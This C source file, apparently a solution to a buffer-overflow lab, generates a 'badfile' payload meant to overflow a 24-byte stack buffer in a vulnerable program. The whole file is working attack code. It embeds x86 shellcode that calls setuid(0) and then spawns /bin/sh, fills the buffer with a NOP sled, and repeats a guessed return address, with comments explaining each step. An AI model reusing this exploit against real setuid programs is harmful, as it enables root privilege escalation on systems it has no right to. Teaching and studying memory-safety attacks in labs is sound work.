/* exploit.c */
/* A program that creates a file containing code for launching shell */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[] =
	// code to call setuid(0)
	"\x31\xc0" /* Line 1: xorl %eax,%eax */
	"\x31\xdb" /* Line 2: xorl %ebx,%ebx */
	"\xb0\xd5" /* Line 3: movb $0xd5,%al */
	"\xcd\x80" /* Line 4: int $0x80 */

	// Code to open shell
	"\x31\xc0" /* Line 1: xorl %eax,%eax */
	"\x50" /* Line 2: pushl %eax */
	"\x68""//sh" /* Line 3: pushl $0x68732f2f */
	"\x68""/bin" /* Line 4: pushl $0x6e69622f */
	"\x89\xe3" /* Line 5: movl %esp,%ebx */
	"\x50" /* Line 6: pushl %eax */
	"\x53" /* Line 7: pushl %ebx */
	"\x89\xe1" /* Line 8: movl %esp,%ecx */
	"\x99" /* Line 9: cdq */
	"\xb0\x0b" /* Line 10: movb $0x0b,%al */
	"\xcd\x80" /* Line 11: int $0x80 */
	;

// Needed to store address of local variable if using 2nd method to get sp.
unsigned long STACK_POINTER = 0;

// Returns the stack pointer for this code using basic assembler instruction.
// We work on the assumption that starting address remains relatively same
// and for small codes we dont have more than 500/1000 bytes on the stack at a time
// This gives us a rough idea of the start of our buffer.

unsigned long get_sp(void) {
	__asm__("movl %esp,%eax");
}

// Returns the address of local variable created in stack by the function.
// We work on the assumption that starting address remains relatively same
// and for small codes we dont have more than 500/1000 bytes on the stack at a time
// This gives us a rough idea of where our buffer is.
// note: code works with both functions, using assembly function for now.

// unsigned long get_sp() {
//   void* p = NULL;
//   STACK_POINTER = (unsigned long)(void*)&p;
//   return STACK_POINTER;
// }

void main(int argc, char **argv)
{
	char buffer[517];

	// Getting pointer to buffer to write shell code.
	char *buffer_pointer = buffer;
	
	// calculating the offset from buffer start to start writing shell code.
	long shellcode_start_offset = sizeof buffer - sizeof shellcode;

	// No of bytes to fill with return address at the start of buffer.
	// Note: num_of_ret_addr_bytes * 4 bytes will be written 
	// since ret addrs is 4 bytes long
	long num_of_ret_addr_bytes = 15;
	
	// Jump from SP to make ret addr point to NOP sled.
	long ret_addr_jmp_offset = 350;

	// Getting long casted pointer to buffer for writting return address.
	// Cast is necessary because return address is 4 bytes and char is 1 byte.  
	long *return_addr_buffer_pointer = (long*) buffer_pointer;

	// Writing shell code at the end of buffer leaving enough room
	// for NOP sled before it to work.
	char *shellcode_start = buffer + shellcode_start_offset;
	
	FILE *badfile;

	/* Initialize buffer with 0x90 (NOP instruction) */
	memset(&buffer, 0x90, sizeof buffer);
	

	// Writing shell code at buffer + ${shellcode_start_offset}.
	
	// memcpy(&buffer[shellcode_start_offset], shellcode, sizeof shellcode);
	
	for (int i = 0; i < sizeof shellcode; i++) {
		*shellcode_start = shellcode[i];
		shellcode_start++;
	}

	// We want to land somewhere in the middle of the buffer (NOP sled) to maximize
	// the chance of finding out shell code. Choosing a relative jump of ${ret_addr_jmp_offset} 
	// from stack pointer in a 517 byte buffer to land in NOP sled.
	unsigned long new_return_addr = get_sp() + ret_addr_jmp_offset;

	// Since buffer is 24 bytes, assuming ret address to be somewhere close to buffer start + 28.
	// This can change slightly based on contents of function. So writing ${num_of_ret_addr_bytes} 
	// bytes from start of buffer to maximize chance of overwriting the ret address.
	for(int i = 0; i < num_of_ret_addr_bytes; i++) {
		*return_addr_buffer_pointer = new_return_addr;
		return_addr_buffer_pointer++;
	}

	/* Save the contents to the file "badfile" */
	badfile = fopen("./badfile", "w");
	fwrite(buffer, 517, 1, badfile);
	fclose(badfile);
}
